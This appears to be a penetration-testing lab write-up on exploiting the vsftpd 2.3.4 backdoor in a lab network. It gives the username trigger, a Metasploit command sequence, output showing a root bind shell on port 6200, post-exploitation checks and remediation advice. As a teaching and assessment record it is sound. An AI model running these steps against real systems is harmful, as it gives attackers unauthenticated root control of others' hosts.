# Exploitation Phase – 1. vsftpd 2.3.4 Backdoor

---

## Vulnerability Phase Identification

**Phase:** Exploitation  
**Vulnerability Identified During:** Scanning & Vulnerability Assessment  
**Affected Service:** FTP  
**Service Version:** vsftpd 2.3.4  
**Port:** TCP 21  

This vulnerability was identified during service enumeration and confirmed during vulnerability assessment using Nmap and Searchsploit.

---

## Vulnerability Overview

vsftpd version **2.3.4** contains a **malicious backdoor** that was intentionally inserted into a compromised source package.  
When a username containing a `:)` sequence is supplied during FTP login, the service spawns a **root-level shell** on **TCP port 6200**.

### Impact
- Remote Code Execution (RCE)
- Root-level access
- No authentication required
- Full system compromise

This is considered a **critical, high-impact vulnerability**.

---

## Tool Used: Metasploit Framework

### Why This Tool Is Used
- Provides a reliable exploit module for known vulnerabilities
- Automates exploitation and payload handling
- Confirms vulnerability impact through real exploitation
- Industry-standard penetration testing framework

### Tool Explanation
Metasploit includes a dedicated exploit module (`vsftpd_234_backdoor`) that triggers the hidden backdoor and connects to the spawned shell automatically.

---

## Exploit Module Information

- **Module Name:** `exploit/unix/ftp/vsftpd_234_backdoor`
- **Payload Used:** `cmd/unix/interact`
- **Exploit Type:** Bind shell (root)
- **Default Backdoor Port:** 6200

---

## Exploitation Command Sequence

    msfconsole -q
    use exploit/unix/ftp/vsftpd_234_backdoor
    set RHOSTS 192.168.56.102
    set RPORT 21
    set payload cmd/unix/interact
    exploit
## Exploit Output (Successful)

[*] 192.168.56.102:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.56.102:21 - USER: 331 Please specify the password.
[+] 192.168.56.102:21 - Backdoor service has been spawned, handling...
[+] 192.168.56.102:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.56.1:41041 -> 192.168.56.102:6200)

## Post-Exploitation Validation
Command Executed:
- whoami
- uname -a
- ifconfig
- pwd
- ls

## Findings
- User: root
- Kernel: Linux 2.6.24-16-server
- Full filesystem access
- Network configuration exposed
- Ability to read/write system files
This confirms complete system compromise.

## What Was Achieved Through This Exploit
- Root shell access obtained
- Full control over the target system
- Ability to:
  - Create or delete users
  - Install malware or backdoors
  - Pivot to internal networks
  - Access sensitive data
  - Disable security mechanisms

## Risk Assessment
| Fctor | Severity |
|---|------|
| Authentication Bypass | Critical | 
| Remote Code Execution | Critical | 
| Privilege Level | Root | 
| Exploit Complexity | Low |
| Impact | Full system compromise |
## Remediation Recommendations
- Immediately upgrade vsftpd to a secure version (≥ 3.x)
- Verify package integrity using trusted repositories
- Disable FTP if not required
- Restrict service exposure via firewall rules
- Monitor logs for suspicious FTP login attempts
- Use secure alternatives such as SFTP (SSH)

## Conclusion
The vsftpd 2.3.4 backdoor vulnerability allows unauthenticated attackers to gain root-level access with minimal effort.

Successful exploitation demonstrates how outdated and compromised services can result in complete host takeover, emphasizing the importance of patch management and service hardening.

---

